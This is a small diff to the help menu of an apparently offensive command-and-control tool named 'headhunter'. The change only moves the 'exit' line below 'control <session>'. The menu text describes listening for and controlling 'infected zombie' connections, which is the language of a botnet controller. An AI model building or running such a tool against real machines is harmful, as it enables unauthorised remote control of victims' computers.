@@ -54,8 +54,8 @@ while True:
 help                      --          displays this menu
 listen <LHOST> <LPORT>    --	      starts listening for zombies on the specified local address and port
 show connections	  -- 	      displays active zombie connections by address and source port
-exit                      --          exits the headhunter interactive shell
 control <session>         --          controls an infected zombie by session number
+exit                      --          exits the headhunter interactive shell
 
 		''')
 
